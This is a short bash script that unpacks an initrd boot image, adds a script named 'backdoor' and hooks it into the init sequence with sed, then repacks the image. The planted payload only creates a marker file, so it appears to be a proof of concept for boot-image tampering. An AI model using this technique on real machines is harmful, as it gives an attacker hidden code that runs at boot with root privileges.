#!/bin/bash

if [[ -z $1 ]] || [[ -z $2 ]]; then
    echo "usage: $0 path_to_initrd path_to_new_initrd"
    exit 1
fi
dir=/tmp/initrd
init_path=$1
new_init_path=$2

function extract() {
    init_name="$(basename "${init_path}")"
    [[ -d ${dir} ]] && rm -rf "${dir}"
    mkdir "${dir}"
    cd "${dir}" || exit 1

    gzip -d > "${init_name}" < "${init_path}"
    bsdcpio -m --preserve-owner -i -F "${init_name}" && rm "${init_name}"
}

function modify() {
    local root=/new_root
    cd "${dir}" || exit 1
cat > ./bin/backdoor <<EOF
echo > ${root}/backdoor
EOF
    sed -i "s:rdlogger_stop:rdlogger_stop\nsh ./bin/backdoor:" ./init
}

function archive() {
    local cpio_opts=('-0' '-o' '-H' 'newc')
    local out=${new_init_path}
    [[ -f ${out} ]] && rm "${out}"

    cd "${dir}" || exit 1
    find . -mindepth 1 -printf '%P\0' |
            LANG=C bsdcpio "${cpio_opts[@]}" |
            gzip > "${out}"
}

extract
modify
archive
